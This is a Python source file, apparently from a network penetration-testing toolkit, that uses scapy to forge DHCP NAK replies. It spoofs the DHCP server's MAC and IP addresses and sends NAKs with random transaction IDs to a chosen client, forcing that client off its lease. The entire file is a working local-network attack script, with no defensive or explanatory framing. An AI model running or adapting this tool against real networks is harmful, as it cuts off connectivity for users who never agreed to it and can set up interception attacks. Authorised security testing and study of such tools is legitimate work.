from base import Base
from argparse import ArgumentParser
from binascii import unhexlify
from random import randint
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp

Base.check_user()

parser = ArgumentParser(description='DHCP NAK sender')

parser.add_argument('-i', '--interface', type=str, help='Set interface name for send reply packets')
parser.add_argument('-c', '--count', type=int, help='Set count of nak requests (default: 3)', default=3)
parser.add_argument('-t', '--target_mac', type=str, required=True, help='Set target client mac address')
parser.add_argument('-o', '--target_ip', type=str, required=True, help='Set target client ip address')
parser.add_argument('-d', '--dhcp_mac', type=str, required=True, help='Set DHCP server mac address')
parser.add_argument('-p', '--dhcp_ip', type=str, required=True, help='Set DHCP server IP address')

args = parser.parse_args()

current_network_interface = None
if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

print "\r\nNetwork interface: " + current_network_interface
print "Target mac address: " + args.target_mac
print "Target IP address: " + args.target_ip
print "DHCP server mac address: " + args.dhcp_mac
print "DHCP server ip address: " + args.dhcp_ip + "\r\n"


def make_dhcp_nak_packet(xid):
    return (Ether(src=args.dhcp_mac, dst=args.target_mac) /
            IP(src=args.dhcp_ip, dst=args.target_ip) /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, chaddr=unhexlify(args.target_mac.replace(":", "")),
                  siaddr=args.dhcp_ip, xid=xid) /
            DHCP(options=[("message-type", "nak"),
                          ('server_id', args.dhcp_ip),
                          "end"]))


if __name__ == "__main__":
    print "Sending DHCP nak reply ..."
    for _ in range(args.count):
        nak_packet = make_dhcp_nak_packet(randint(1, 4294967295))
        sendp(nak_packet, iface=current_network_interface, verbose=False)
